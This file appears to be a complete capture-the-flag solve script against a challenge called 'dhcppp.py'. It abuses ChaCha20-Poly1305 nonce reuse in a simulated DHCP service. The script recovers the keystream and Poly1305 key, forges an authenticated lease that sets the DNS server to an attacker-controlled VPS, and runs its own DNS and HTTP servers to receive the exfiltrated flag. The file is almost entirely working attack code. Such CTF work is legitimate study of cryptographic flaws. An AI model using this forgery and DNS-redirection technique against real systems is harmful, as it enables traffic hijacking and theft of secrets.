#!/usr/bin/env python3

from flask import Flask
from nserver import A, NameServer, Query, Settings
from pwn import log, logging, os, process, remote, sleep, sys, Thread, xor
from zlib import crc32

from Crypto.Util.number import long_to_bytes

from sage.all import GF, PolynomialRing


done = False
VPS_IP = '12.34.56.78'

dns_server = NameServer('dns', Settings(
    console_log_level=logging.FATAL,
    server_address='0.0.0.0',
    server_port=53,
))
http_server = Flask('http')

logging.getLogger('werkzeug').disabled = True
sys.modules['flask.cli'].show_server_banner = lambda *_: None


@dns_server.rule('example.com', ['A'])
def example_a_records(query: Query):
    return A(query.name, VPS_IP)

@http_server.route('/<flag>')
def flag(flag):
    global done
    log.success(flag)
    sleep(1)
    done = True
    return '', 200


Thread(target=dns_server.run, args=()).start()
Thread(target=http_server.run, kwargs={'host': '0.0.0.0', 'port': 80}).start()


def get_process():
    if len(sys.argv) == 1:
        return process(['python3', 'dhcppp.py'])

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


def calc_crc(msg):
    return crc32(msg).to_bytes(4, 'little')


def send_recv(data: bytes) -> bytes:
    io.sendlineafter(b'> ', data.hex().encode())
    return bytes.fromhex(io.recvline().decode())


def parse_enc(enc: bytes):
    ct = enc[:-28]
    tag = enc[-28:-12]
    nonce = enc[-12:]
    return ct, tag, nonce


def update(msg):
    return msg + b'\0' * (16 - (len(msg) & 0x0F)) + long_to_bytes(0, 8)[::-1] + long_to_bytes(len(msg), 8)[::-1]


def forge(msg, r, s):
    q = (len(msg) + 15) // 16
    tot = 0

    for i in range(q):
        sub = msg[i * 16 : i * 16 + 16] + b'\x01'
        sub += (17 - len(sub)) * b'\0'
        num = int.from_bytes(sub, 'little')
        tot = (tot + num) * r

    tot = tot % mod1305
    result = (tot + s) % (1 << 128)
    return long_to_bytes(result)[::-1]


io = get_process()

DHCP_MAC = bytes.fromhex('1b 7d 6f 49 37 c9')
FLAG_MAC = bytes.fromhex('53 79 82 b5 97 eb')

for _ in range(3, 64 - 1):
    send_recv(b'\0' * 6 + DHCP_MAC + b'\x01' + b'A' * 12)

data1 = send_recv(b'\0' * 6 + DHCP_MAC + b'\x01' + b'A' * 12 + b'B')

for _ in range(3, 64):
    send_recv(b'\0' * 6 + DHCP_MAC + b'\x01' + b'A' * 12)

data2 = send_recv(b'\0' * 6 + DHCP_MAC + b'\x01' + b'A' * 12 + b'C')

dst1, src1, lease1 = data1[:6], data1[6:12], data1[12:]
dst2, src2, lease2 = data2[:6], data2[6:12], data2[12:]
assert lease1[0] == lease2[0] == 2

ct1, tag1, nonce1 = parse_enc(lease1[1:-4])
ct2, tag2, nonce2 = parse_enc(lease2[1:-4])
assert nonce1 == nonce2

pkt = bytearray(
    bytes([int(x) for x in '192.168.1.2'.split('.')]) +
    bytes([int(x) for x in '192.168.1.1'.split('.')]) +
    bytes([255, 255, 255, 0]) +
    bytes([8, 8, 8, 8]) +
    bytes([8, 8, 4, 4]) +
    b'A' * 12 + b'B' +
    b'\0'
)

assert len(ct1) == len(pkt)
key_stream = xor(ct1, pkt)

msg1 = update(ct1)
msg2 = update(ct2)

result1 = int.from_bytes(tag1, 'little')
result2 = int.from_bytes(tag2, 'little')

mod1305 = (1 << 130) - 5

r_sym = PolynomialRing(GF(mod1305), 'r').gens()[0]

q1 = (len(msg1) + 15) // 16
tot1 = 0

possible_r = set()

for i in range(q1):
    sub = msg1[i * 16 : i * 16 + 16] + b'\x01'
    sub += (17 - len(sub)) * b'\0'
    num = int.from_bytes(sub, 'little')
    tot1 = (tot1 + num) * r_sym

q2 = (len(msg2) + 15) // 16
tot2 = 0

for i in range(q2):
    sub = msg2[i * 16 : i * 16 + 16] + b'\x01'
    sub += (17 - len(sub)) * b'\0'
    num = int.from_bytes(sub, 'little')
    tot2 = (tot2 + num) * r_sym

for k in range(-4, 4 + 1):
    roots = (tot1 - tot2 - (result1 - result2) + k * 2 ** 128).roots()
    for root, mult in roots:
        possible_r.add(int(root))

for r in possible_r:
    if int(r).bit_length() <= 124:
        break

s = (result1 - int(tot1.subs({r_sym: r}))) % (2 ** 128)
io.info(f'{r = }')
io.info(f'{s = }')

assert tag1 == forge(update(ct1), r, s)
assert tag2 == forge(update(ct2), r, s)

pkt = bytearray(
    bytes([127, 0, 0, 1]) +
    bytes([0, 0, 0, 0]) +
    bytes([255, 255, 255, 0]) +
    bytes(int(x) for x in VPS_IP.split('.')) +
    bytes(int(x) for x in VPS_IP.split('.')) +
    b'A' * 12 + b'X' +
    b'\0'
)

crc = calc_crc(pkt)
ct = xor(pkt, key_stream)
tag = forge(update(ct), r, s)

data = b'\0' * 6 + FLAG_MAC + b'\x02' + (ct + tag + nonce1) + crc
io.sendlineafter(b'> ', data.hex().encode())
assert b'DEBUG' in io.recvline()

data = b'\0' * 6 + FLAG_MAC + b'\x03'
io.sendlineafter(b'> ', data.hex().encode())

while not done:
    pass

io.close()
os._exit(0)
